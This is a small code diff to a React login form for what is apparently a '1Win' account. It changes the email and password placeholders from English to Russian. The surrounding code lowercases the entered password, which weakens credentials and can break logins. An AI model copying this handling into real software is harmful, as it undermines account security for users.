@@ -53,7 +53,7 @@ localStorage.removeItem('user')
         required
       className="inputs"
         type="email"
-        placeholder="Enter 1Win email"
+        placeholder="Напишите 1Win email"
         onChange={(e) => {
           setData({ ...data, email: e.target.value.toLocaleLowerCase() });
         }}
@@ -63,7 +63,7 @@ localStorage.removeItem('user')
       className="inputs"
 required
         type="password"
-        placeholder="1Win Password"
+        placeholder="Напишите пароль"
         onChange={(e) => {
           setData({ ...data, password: e.target.value.toLocaleLowerCase() });
         }}
